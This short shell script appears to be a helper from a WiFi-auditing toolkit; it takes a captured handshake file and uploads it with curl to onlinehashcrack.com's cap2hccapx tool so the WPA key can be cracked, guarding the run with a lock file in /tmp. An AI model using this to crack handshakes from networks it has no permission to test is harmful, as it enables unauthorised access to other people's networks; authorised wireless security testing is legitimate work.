#!/bin/sh

[[ -f /tmp/HandshakeCrack.progress ]] && {
  exit 0
}

FILE=$1

touch /tmp/HandshakeCrack.progress

if [[ ! -f ${FILE} ]]; then
    echo -e "File ${FILE} does not exist."
else
    curl -s -v -F 0="cap2hccapx" -F file_data=@${FILE} https://www.onlinehashcrack.com/tools-upload.php
fi

rm /tmp/HandshakeCrack.progress
